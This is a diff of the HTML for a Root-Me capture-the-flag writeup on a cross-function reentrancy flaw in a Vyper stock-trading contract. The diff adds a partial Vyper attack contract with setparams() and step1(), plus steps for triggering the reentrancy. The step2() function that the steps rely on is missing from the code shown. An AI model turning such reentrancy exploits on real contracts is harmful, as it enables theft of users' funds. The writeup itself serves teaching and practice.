@@ -30,7 +30,7 @@ Vulnerability Overview 🛑 Vulnerability: The vulnerability lies in the insecur
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/blog.root-me.org\/posts\/writeup_snippet_03\/"
-        },"genre": "posts","keywords": "Writeup, code snippet, Web3, vyper, Cross-Function-Reentrancy","wordcount":  320 ,
+        },"genre": "posts","keywords": "Writeup, code snippet, Web3, vyper, Cross-Function-Reentrancy","wordcount":  385 ,
         "url": "https:\/\/blog.root-me.org\/posts\/writeup_snippet_03\/","datePublished": "2024-12-03T00:00:00+00:00","dateModified": "2024-12-03T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -86,7 +86,7 @@ Vulnerability Overview 🛑 Vulnerability: The vulnerability lies in the insecur
             <div class="toc-content" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Code Snippet Serie - 03 - Cross-Function-Reentrancy</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/K-L-M" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>K.L.M</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-12-03">2024-12-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;320 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-12-03">2024-12-03</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;385 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -133,23 +133,43 @@ Vulnerability Overview 🛑 Vulnerability: The vulnerability lies in the insecur
 <li>
 <p>🎭 <strong>Exploitation Steps</strong>:</p>
 <ul>
-<li>
-<p>🛠️ <strong>Creating a malicious contract to exploit the Cross-Function-Reentrancy</strong>:</p>
-<ul>
-<li>insérer image du contrat exploit en vyper</li>
-</ul>
-</li>
-<li>
-<p>📤 <strong>Submitting the Malicious Payload</strong>:</p>
-<ul>
-<li>Set your target with the <code>setparams()</code> function.</li>
-<li>Trigger the <code>step1()</code> function by sending a tx to the attack contract.</li>
-<li>Trigger the reentrancy by sending a tx to the <code>step2()</code> function.</li>
-</ul>
-</li>
+<li>🛠️ <strong>Creating a malicious contract to exploit the Cross-Function-Reentrancy</strong>:</li>
 </ul>
 </li>
 </ol>
+<pre tabindex="0"><code class="language-Vyper" data-lang="Vyper"># @version 0.2.15
+
+&quot;&quot;&quot;
+@author KLM
+@title Solve for The Cross Function Reentrancy
+&quot;&quot;&quot;
+# External Interfaces
+interface SS:
+    def buyStock(): payable
+    def sellStock(sell_order: uint256): nonpayable
+    def transferStock(receiver: address, transfer_order: uint256): nonpayable
+    def company() -&gt; address: view
+    def totalShares() -&gt; uint256: view
+    def price() -&gt; uint256: view
+
+snaketarget: SS
+me: address
+
+@external
+def setparams(_target: address, _me: address):
+    self.snaketarget = SS(_target)
+    self.me = _me
+
+@external
+@payable
+def step1():
+    self.snaketarget.buyStock(value=msg.value)
+</code></pre><pre><code>-   📤 **Submitting the Malicious Payload**:
+
+    -   Set your target with the `setparams()` function.
+    -   Trigger the `step1()` function by sending a tx to the attack contract.
+    -   Trigger the reentrancy by sending a tx to the `step2()` function.
+</code></pre>
 <h2 id="mitigation">Mitigation</h2>
 <p>🔒 To mitigate this vulnerability, the following measures can be taken:</p>
 <ul>
